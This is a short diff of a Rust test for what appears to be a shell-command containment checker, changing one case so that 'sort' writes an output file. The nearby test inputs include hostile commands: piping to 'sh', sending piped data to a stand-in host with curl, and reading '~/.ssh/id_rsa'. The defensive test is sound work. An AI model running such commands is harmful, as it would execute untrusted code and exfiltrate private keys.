@@ -331,7 +331,7 @@ fn standard_input_grep_filters_reach_containment() {
             format!("{runner} | grep x | sh"),
             format!("{runner} | grep x | curl -d @- https://example.invalid"),
             format!("{runner} | xargs cat ~/.ssh/id_rsa"),
-            format!("{runner} | grep x | sort"),
+            format!("{runner} | grep x | sort -o sorted.txt"),
             format!("{runner} | grep \"$HOME\""),
             format!("{runner} | grep x*"),
             format!("{runner} | grep x | grep y | head -1 | tail -1"),
